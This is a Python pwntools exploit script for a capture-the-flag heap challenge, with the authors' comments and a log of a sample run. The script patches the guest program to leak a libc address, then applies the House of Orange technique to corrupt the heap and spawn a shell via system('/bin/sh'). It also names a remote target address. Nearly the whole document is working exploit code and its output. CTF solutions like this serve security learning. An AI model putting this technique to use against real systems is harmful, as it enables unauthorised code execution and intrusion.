#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch='amd64', os='linux', terminal=['tmux', 'new-window'])

binary = ELF('./0e73066d87ff433989805349cfddc758')

argv = [binary.path]
envp = {'PWD': os.getcwd()}

if not args['REMOTE']:
    if args['GDB']:
        context(aslr=False)
        io = gdb.debug(args=argv, env=envp, gdbscript='''\
            continue
        ''')
    else:
        io = process(argv=argv, env=envp)
    binary.address = io.libs()[binary.path]
else:
    io = remote('34.236.229.208', 9999)

# by @integeruser and @comewel

# didn't make it in time for the ctf; this exploit was tested using the Docker image `amd64/ubuntu:xenial` (has exactly
# the same libc provided for the challenge)

# this PoC is based on the "House of Orange" heap exploitation technique and is not super reliable; it might be needed
# to re-execute this script a few times to spawn a shell


def alloc_guest_memory(size):
    io.recvuntil('Your choice:')
    io.send('1')
    io.recvuntil('Size:')
    io.send(p16(size))


def update_guest_memory(index, content):
    io.recvuntil('Your choice:', timeout=0.5)
    io.send('2')
    io.recvuntil('Index:', timeout=0.5)
    io.send(chr(index))
    io.recvuntil('Content:', timeout=0.5)
    io.send(content)


def alloc_host_memory(size):
    io.recvuntil('Your choice:')
    io.send('4')
    io.recvuntil('Size:')
    io.send(p16(size))


def update_host_memory(size, index, content):
    io.recvuntil('Your choice:')
    io.send('5')
    io.recvuntil('Size:')
    io.send(p16(size))
    io.recvuntil('Index:')
    io.send(chr(index))
    io.recvuntil('Content:')
    io.send(content)


def free_host_memory(index):
    io.recvuntil('Your choice:')
    io.send('6')
    io.recvuntil('Index:')
    io.send(chr(index))


def get_original_guest_code():
    with open('guest', 'rb') as f:
        return list(f.read())


# part 1: leaking an address from libc

# allocate host chunks A and B
alloc_host_memory(0x100)
alloc_host_memory(0x100)
# deallocate A so that it is put in the unsorted bin and its `fd` and `bk` pointers are set to `main_arena->top`
free_host_memory(0)

# allocate 0xb guest chunks of size 0x1000, filling the guest memory
for _ in range(0xb):
    alloc_guest_memory(0x1000)
# because of a bug, the next guest chunk allocated will be stored at address 0x0
alloc_guest_memory(0x200)
# hence, by updating the content of this chunk we can replace the code of the guest program
# we decided to reupload the original guest program code with two small changes
guest_code = get_original_guest_code()
# we replace two bytes so that, when printing the menu, the guest program will also print the next ~0x5000 characters;
# in this way, we leak the memory area reserved to alloced guest chunks
guest_code[0x14] = chr(0x50)
guest_code[0x15] = chr(0x50)
# we also replace another byte to change the behaviour of update_host_memory() (in host program code, following
# .text:0000000000000E44), so that we can memcpy data from host chunks to the guest memory (instead of the opposite)
guest_code[0x1a4] = chr(0x2)
update_guest_memory(0xb, ''.join(guest_code[:0x200]))

# trigger update_host_memory() to copy the address of `main_arena->top` to the guest memory
alloc_host_memory(0x80)
update_host_memory(0x80, 0, 'X' * 0x80)

# the menu and the next ~0x5000 characters of guest memory are now printed, leaking the address of `main_arena->top`
io.recvn(0x3db9)
main_arena_top_addr = u64(io.recvn(7).ljust(8, '\x00'))
# compute the base address of libc
libc_base_addr = main_arena_top_addr - 0x3c4c78
success('libc_base_addr {}'.format(hex(libc_base_addr)))

# we now reupload the original guest program code to restore a sane menu printing for part 2
guest_code = get_original_guest_code()
guest_code = ''.join(guest_code[:0x200])
update_guest_memory(0xb, ''.join(guest_code[:0x200]))

# also, reset heap state for part 2
free_host_memory(0)
free_host_memory(1)


# part 2: executing system('/bin/sh') via House of Orange

# allocate chunk A
alloc_host_memory(0x600)

# we change the guest code again; this time, we replace a single byte to change the behaviour of free_host_memory()
# (in host program code, following .text:0000000000000CB8), so that pointers to freed host chunks won't be set to NULL
# anymore, allowing UAFs
guest_code = get_original_guest_code()
guest_code[0x1e3] = chr(0x1)
update_guest_memory(0xb, ''.join(guest_code[:0x200]))

# deallocate A
free_host_memory(0)
# we can now use update_host_memory() with index 0 to write 0x600 bytes starting from the address of chunk A,
# even if it was just freed (because of the UAF)

# we now apply "House of Orange" (as in https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c)

# allocate chunk B
alloc_host_memory(0x400 - 16)

# overwrite top chunk's metadata
payload = fit({0x3f8: p64(0xc01)})
update_host_memory(len(payload), 0, payload)

# allocate chunk C
alloc_host_memory(0x1000)

# we need to store the address of system() somewhere; for example, in the guest memory
system_addr = libc_base_addr + 0x45390
update_guest_memory(0, fit({0: p64(system_addr)}, length=0x1000))
system_addr_in_guest_mem = libc_base_addr + 0x5d8000 + 0x5000

# again, override top chunk's metadata
io_list_all_addr = libc_base_addr + 0x3c5520
payload = fit(
    {
        0x3f0 + 0x0: '/bin/sh\x00',
        0x3f0 + 0x08: p64(0x61),
        0x3f0 + 0x18: p64(io_list_all_addr - 0x10),
        0x3f0 + 0x20: p64(2),
        0x3f0 + 0x28: p64(3),
        0x3f0 + 0xd8: p64(system_addr_in_guest_mem - 0x18),
    },
    filler='\x00')
update_host_memory(len(payload), 0, payload)

# trigger the whole HoO chain
alloc_host_memory(0x100)

io.interactive()
# root@63f7bbb29206:/home/share# ./0e73066d87ff433989805349cfddc758.py
# [*] '/home/share/0e73066d87ff433989805349cfddc758'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Starting local process '/home/share/0e73066d87ff433989805349cfddc758': pid 106
# [+] libc_base_addr 0x7fdae4c7b000
# [*] Switching to interactive mode
# *** Error in `/home/share/0e73066d87ff433989805349cfddc758': malloc(): memory corruption: 0x00007fdae5040520 ***
# ======= Backtrace: =========
# /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fdae4cf27e5]
# /lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7fdae4cfd13e]
# /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7fdae4cff184]
# /home/share/0e73066d87ff433989805349cfddc758(+0xc2a)[0x56368326ec2a]
# /home/share/0e73066d87ff433989805349cfddc758(+0x16be)[0x56368326f6be]
# /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fdae4c9b830]
# /home/share/0e73066d87ff433989805349cfddc758(+0xa89)[0x56368326ea89]
# ======= Memory map: ========
# 56368326e000-563683270000 r-xp 00000000 08:12 1462                       /home/share/0e73066d87ff433989805349cfddc758
# 563683470000-563683471000 r--p 00002000 08:12 1462                       /home/share/0e73066d87ff433989805349cfddc758
# 563683471000-563683472000 rw-p 00003000 08:12 1462                       /home/share/0e73066d87ff433989805349cfddc758
# 5636848da000-56368491d000 rw-p 00000000 00:00 0                          [heap]
# 7fdae0000000-7fdae0021000 rw-p 00000000 00:00 0
# 7fdae0021000-7fdae4000000 ---p 00000000 00:00 0
# 7fdae4a65000-7fdae4a7b000 r-xp 00000000 08:12 932057                     /lib/x86_64-linux-gnu/libgcc_s.so.1
# 7fdae4a7b000-7fdae4c7a000 ---p 00016000 08:12 932057                     /lib/x86_64-linux-gnu/libgcc_s.so.1
# 7fdae4c7a000-7fdae4c7b000 rw-p 00015000 08:12 932057                     /lib/x86_64-linux-gnu/libgcc_s.so.1
# 7fdae4c7b000-7fdae4e3b000 r-xp 00000000 08:12 932036                     /lib/x86_64-linux-gnu/libc-2.23.so
# 7fdae4e3b000-7fdae503b000 ---p 001c0000 08:12 932036                     /lib/x86_64-linux-gnu/libc-2.23.so
# 7fdae503b000-7fdae503f000 r--p 001c0000 08:12 932036                     /lib/x86_64-linux-gnu/libc-2.23.so
# 7fdae503f000-7fdae5041000 rw-p 001c4000 08:12 932036                     /lib/x86_64-linux-gnu/libc-2.23.so
# 7fdae5041000-7fdae5045000 rw-p 00000000 00:00 0
# 7fdae5045000-7fdae506b000 r-xp 00000000 08:12 932016                     /lib/x86_64-linux-gnu/ld-2.23.so
# 7fdae5252000-7fdae5253000 rw-p 00000000 00:00 0
# 7fdae5253000-7fdae5263000 rw-s 00000000 00:05 49357                      /dev/zero (deleted)
# 7fdae5263000-7fdae5266000 rw-p 00000000 00:00 0
# 7fdae5266000-7fdae5269000 rw-s 00000000 00:0d 12589                      anon_inode:kvm-vcpu:0
# 7fdae5269000-7fdae526a000 rw-s 00000000 00:05 49358                      /dev/zero (deleted)
# 7fdae526a000-7fdae526b000 r--p 00025000 08:12 932016                     /lib/x86_64-linux-gnu/ld-2.23.so
# 7fdae526b000-7fdae526c000 rw-p 00026000 08:12 932016                     /lib/x86_64-linux-gnu/ld-2.23.so
# 7fdae526c000-7fdae526d000 rw-p 00000000 00:00 0
# 7ffda9a76000-7ffda9a97000 rw-p 00000000 00:00 0                          [stack]
# 7ffda9b1b000-7ffda9b1e000 r--p 00000000 00:00 0                          [vvar]
# 7ffda9b1e000-7ffda9b20000 r-xp 00000000 00:00 0                          [vdso]
# $ ls
# 0e73066d87ff433989805349cfddc758     guest
# 0e73066d87ff433989805349cfddc758.py  libc-2.23.so
